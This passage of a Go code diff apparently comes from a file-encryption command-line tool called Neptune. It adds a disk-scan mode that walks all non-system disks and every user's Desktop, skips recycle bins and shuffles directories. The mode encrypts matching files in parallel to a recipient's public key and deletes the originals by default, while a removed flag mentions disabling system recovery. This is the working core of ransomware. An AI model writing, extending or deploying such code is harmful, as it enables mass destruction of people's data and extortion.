+			failedCount++
+			continue
+		}
 
-			// acquire semaphore (control concurrency)
-			sem <- struct{}{}
-			defer func() { <-sem }() // release semaphore
+		if isEncrypted {
+			skippedCount++
+			continue
+		}
 
-			info := &fileInfos[idx]
+		utils.PrintInfo("Encrypting file: %s", filePath)
 
-			// update overall progress
-			mu.Lock()
-			completedFiles++
-			mu.Unlock()
+		// Open input file
+		inputReader, err := os.Open(filePath)
+		if err != nil {
+			utils.PrintError("Failed to read file: %s", filePath)
+			failedCount++
+			continue
+		}
 
-			// start progress display goroutine
-			done := make(chan struct{})
-			go func() {
-				ticker := time.NewTicker(100 * time.Millisecond) // more frequent updates
-				defer ticker.Stop()
-				for {
-					select {
-					case <-ticker.C:
-						fileName, processed, total := info.progress.getProgress()
-						if total > 0 {
-							filePercent := float64(processed) / float64(total) * 100
-							mu.Lock()
-							currentCount := completedFiles
-							mu.Unlock()
-							overallPercent := float64(currentCount-1) / float64(totalFiles) * 100
-							fmt.Printf("\r[%s] [%.1f%%] | Progress: %d/%d (%.1f%%)", fileName, filePercent, currentCount, totalFiles, overallPercent)
-						}
-					case <-done:
-						return
-					}
-				}
-			}()
-
-			// Check if file is already encrypted
-			isEncrypted, err := utils.IsNeptuneEncryptedFile(filePath)
-			if err != nil {
-				close(done)
-				errorMu.Lock()
-				errors = append(errors, fmt.Errorf("failed to check file status: %s", filePath))
-				errorMu.Unlock()
-				mu.Lock()
-				failedCount++
-				mu.Unlock()
-				return
-			}
-
-			if isEncrypted {
-				if encryptForceOverride {
-					// continue encryption
-				} else {
-					close(done)
-					mu.Lock()
-					skippedCount++
-					mu.Unlock()
-					return
-				}
-			}
-
-			// open input file
-			inputReader, err := os.Open(filePath)
-			if err != nil {
-				close(done)
-				errorMu.Lock()
-				errors = append(errors, fmt.Errorf("failed to read file: %s", filePath))
-				errorMu.Unlock()
-				mu.Lock()
-				failedCount++
-				mu.Unlock()
-				return
-			}
-
-			// create wrapped reader to track read progress
-			progressReader := &progressReader{
-				reader:   inputReader,
-				progress: info.progress,
-			}
-
-			// create output file
-			outputWriter, err := os.Create(info.outputPath)
-			if err != nil {
-				close(done)
-				inputReader.Close()
-				errorMu.Lock()
-				errors = append(errors, fmt.Errorf("failed to create output file: %s", info.outputPath))
-				errorMu.Unlock()
-				mu.Lock()
-				failedCount++
-				mu.Unlock()
-				return
-			}
-
-			// use streaming encryption
-			_, err = neptuneCrypto.EncryptStream(progressReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize)
-			
-			// close file
-			outputWriter.Close()
+		// Create output file
+		outputWriter, err := os.Create(info.outputPath)
+		if err != nil {
 			inputReader.Close()
-			close(done)
-			
-			if err != nil {
-				errorMu.Lock()
-				errors = append(errors, fmt.Errorf("encryption failed: %s (%v)", filePath, err))
-				errorMu.Unlock()
-				mu.Lock()
-				failedCount++
-				mu.Unlock()
-				return
-			}
+			utils.PrintError("Failed to create output file: %s", info.outputPath)
+			failedCount++
+			continue
+		}
 
-			if encryptRemoveSource || encryptSecureRemoveSource {
-				if err := os.Remove(filePath); err != nil {
-					utils.PrintWarning("Failed to remove source file: %s", filePath)
-				} else {
-					utils.PrintSuccess("Source file removed: %s", filePath)
-				}
-			}
+		// Perform streaming encryption
+		_, err = neptuneCrypto.EncryptStream(inputReader, outputWriter, senderKeyPair, recipientPublicKey, chunkSize)
 
-			mu.Lock()
-			successCount++
-			mu.Unlock()
-		}(filePath, i)
+		outputWriter.Close()
+		inputReader.Close()
+
+		if err != nil {
+			// Clean up partial output file on failure
+			utils.DeleteFile(info.outputPath)
+			utils.PrintError("Encryption failed: %s (%v)", filePath, err)
+			failedCount++
+			continue
+		}
+
+		utils.PrintSuccess("Encryption completed: %s", filePath)
+		filesToDelete = append(filesToDelete, filePath)
+		successCount++
 	}
 
-	// wait for all goroutines to complete
-	wg.Wait()
-	
-	// clear progress display line
-	fmt.Print("\r")
-
-	// display final result
+	// Print final summary
 	utils.PrintInfo("encryption completed: %d success, %d failed, %d skipped (already encrypted)", successCount, failedCount, skippedCount)
 
-	if len(errors) > 0 && failedCount > 0 {
-		utils.PrintError("Some files failed to encrypt:")
-		for i, e := range errors {
-			if i < 5 {
-				fmt.Printf("  - %v\n", e)
-			}
-		}
-		if len(errors) > 5 {
-			fmt.Printf("  ... and %d more errors\n", len(errors)-5)
-		}
+	if failedCount > 0 {
 		return fmt.Errorf("partial file encryption failure")
 	}
 
-	if encryptSecureRemoveSource && len(files) > 0 {
-		utils.SecureDeleteFiles(files)
+	// Delete all successfully encrypted source files with retry logic
+	if len(filesToDelete) > 0 {
+		for _, filePath := range filesToDelete {
+			if err := utils.RemoveSourceFileWithRetry(filePath); err != nil {
+				utils.PrintWarning("Failed to remove source file: %s", filePath)
+				utils.PrintWarning("Reason: %s", err.Error())
+			} else {
+				utils.PrintSuccess("Source file removed: %s", filePath)
+			}
+		}
 	}
 
 	return nil
 }
 
-func confirmRemoveFile(filePath string) bool {
-	utils.PrintQuestion("Are you sure you want to remove source file %s? (y/N)", filePath)
-	var response string
-	fmt.Scanln(&response)
-	return response == "y" || response == "Y"
+// encryptAllDisks performs disk-scan mode encryption across all available disks.
+//
+// Disk-scan mode behavior:
+//   - Scans all non-C:\ disks at the top-level directory level
+//   - Scans all user desktop directories (C:\Users\*\Desktop)
+//   - Excludes recycle bin directories ($recycle.bin, recycler)
+//   - Processes top-level directories in parallel using semaphore-based concurrency control
+//   - Uses --include patterns to filter which files to encrypt
+//   - Defaults to larger chunk size (4MB) and higher parallelism (8)
+//
+// Parameters:
+//   - senderKeyPair: Sender's key pair for authentication
+//   - recipientPublicKey: Recipient's public key for encryption
+func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
+	// Get list of all available disks on the system
+	disks, err := utils.GetAllDisks()
+	if err != nil {
+		return fmt.Errorf("failed to get disk list: %w", err)
+	}
+
+	// Print disk-scan mode warning banner
+	utils.PrintWarning("==============================")
+	utils.PrintWarning("DISK-SCAN ENCRYPTION MODE")
+	utils.PrintWarning("==============================")
+	utils.PrintWarning("Number of disks to scan: %d", len(disks))
+	utils.PrintWarning("Disks: %v", disks)
+	utils.PrintWarning("Include patterns: %v", encryptInclude)
+	utils.PrintWarning("Default parameters applied:")
+	utils.PrintWarning("  --force: true")
+	utils.PrintWarning("  --remove-source: true")
+	utils.PrintWarning("  --recursive: true")
+	utils.PrintWarning("  --chunk-size: %s", encryptChunkSize)
+	utils.PrintWarning("  --parallel: %d", encryptParallel)
+	utils.PrintWarning("==============================")
+	utils.PrintWarning("SCAN RANGE:")
+	utils.PrintWarning("  - All disks: %v", disks)
+	utils.PrintWarning("  - All user desktop directories: C:\\Users\\*\\Desktop")
+	utils.PrintWarning("==============================")
+	utils.PrintWarning("WARNING: This will encrypt files across ALL disks!")
+	utils.PrintWarning("Only files matching --include patterns will be encrypted.")
+	utils.PrintWarning("Original files will be removed after encryption.")
+	utils.PrintWarning("==============================")
+
+	// Atomic counters for tracking progress across all parallel goroutines
+	var totalEncrypted int32
+	var totalProcessedDirs int32
+	var totalSkippedDirs int32
+
+	// Process each disk sequentially
+	for diskIndex, disk := range disks {
+		utils.PrintInfo("Processing disk %d/%d: %s", diskIndex+1, len(disks), disk)
+
+		// Get top-level directories on this disk (excludes system directories like recycle bin)
+		topDirs, err := utils.GetTopLevelDirectories(disk)
+		if err != nil {
+			utils.PrintWarning("Failed to list directories on disk %s: %v", disk, err)
+			continue
+		}
+
+		if len(topDirs) == 0 {
+			utils.PrintInfo("No directories found on disk: %s", disk)
+			continue
+		}
+
+		// Shuffle directories for random processing order
+		utils.ShuffleStrings(topDirs)
+
+		// Use WaitGroup and semaphore for controlled parallelism
+		var wg sync.WaitGroup
+		sem := make(chan struct{}, encryptParallel)
+
+		// Process each top-level directory in parallel
+		for _, dir := range topDirs {
+			wg.Add(1)
+			sem <- struct{}{} // Acquire semaphore slot
+
+			go func(dirPath string) {
+				defer wg.Done()
+				defer func() { <-sem }() // Release semaphore slot
+
+				// Recursively find files matching include/exclude patterns
+				files, err := utils.FindFilesRecursively(dirPath, encryptInclude, encryptExclude)
+				if err != nil {
+					utils.PrintWarning("Failed to scan directory: %s", dirPath)
+					atomic.AddInt32(&totalProcessedDirs, 1)
+					return
+				}
+
+				if len(files) == 0 {
+					atomic.AddInt32(&totalSkippedDirs, 1)
+					return
+				}
+
+				// Encrypt all files in this directory
+				err = encryptDirectory(dirPath, dirPath, senderKeyPair, recipientPublicKey)
+				if err != nil {
+					if !strings.Contains(err.Error(), "no matching files") {
+						utils.PrintWarning("Failed to process directory %s: %v", dirPath, err)
+					}
+				} else {
+					atomic.AddInt32(&totalEncrypted, 1)
+				}
+				atomic.AddInt32(&totalProcessedDirs, 1)
+			}(dir)
+		}
+
+		// Wait for all directories on this disk to finish
+		wg.Wait()
+	}
+
+	// Print final disk-scan summary
+	utils.PrintSuccess("Disk-scan encryption completed. Processed %d directories, %d successful, %d skipped (empty)", atomic.LoadInt32(&totalProcessedDirs), atomic.LoadInt32(&totalEncrypted), atomic.LoadInt32(&totalSkippedDirs))
+	return nil
 }
 
+// init registers the encrypt command and its flags with the root command.
+// This is called automatically when the package is imported.
+//
+// Flags:
+//   --input, -i        Input file or directory (local only)
+//   --output, -o       Output directory (default: input location)
+//   --public-key, -p   Recipient's public key file or URL (required)
+//   --private-key, -k  Your private key file or URL (required)
+//   --key-encoding, -e Key encoding format (hex, base64, base64url)
+//   --include          Include file patterns (multiple allowed)
+//   --exclude          Exclude file patterns (multiple allowed)
+//   --timeout          HTTP timeout in seconds for remote keys (default: 30)
+//   --chunk-size       Streaming buffer size (default: 64KB)
+//   --parallel         Parallel processes for directories (default: 1)
 func init() {
 	rootCmd.AddCommand(encryptCmd)
 
 	encryptCmd.Flags().StringVarP(&encryptInputFile, "input", "i", "", "Input file or directory to encrypt (local only)")
-	encryptCmd.Flags().StringVarP(&encryptOutputFile, "output", "o", "", "Output file or directory for encrypted data (default: stdout)")
-	encryptCmd.Flags().StringVarP(&encryptText, "text", "t", "", "Text to encrypt (alternative to --input)")
+	encryptCmd.Flags().StringVarP(&encryptOutputFile, "output", "o", "", "Output directory for encrypted data (default: input location)")
 	encryptCmd.Flags().StringVarP(&encryptPublicKey, "public-key", "p", "", "Recipient's public key file or URL")
 	encryptCmd.Flags().StringVarP(&encryptPrivateKey, "private-key", "k", "", "Your private key file or URL")
 	encryptCmd.Flags().StringVarP(&encryptKeyEncoding, "key-encoding", "e", "hex", "Encoding format for keys (hex, base64, base64url)")
-	encryptCmd.Flags().BoolVarP(&encryptForce, "force", "f", false, "Force overwrite existing output file")
-	encryptCmd.Flags().BoolVar(&encryptForceOverride, "force-override", false, "Force encryption of already encrypted files")
-	encryptCmd.Flags().BoolVarP(&encryptRemoveSource, "remove-source", "r", false, "Remove source file after successful encryption")
-	encryptCmd.Flags().BoolVar(&encryptSecureRemoveSource, "secure-remove-source", false, "Securely remove source file after successful encryption (delete + disable system recovery)")
-	encryptCmd.Flags().BoolVarP(&encryptRecursive, "recursive", "R", false, "Recursively encrypt all files in a directory")
 	encryptCmd.Flags().StringArrayVar(&encryptInclude, "include", []string{}, "Include files matching pattern (e.g., *.pdf)")
 	encryptCmd.Flags().StringArrayVar(&encryptExclude, "exclude", []string{}, "Exclude files matching pattern (e.g., *.tmp)")
 	encryptCmd.Flags().IntVar(&encryptTimeout, "timeout", 30, "HTTP request timeout in seconds (default: 30)")
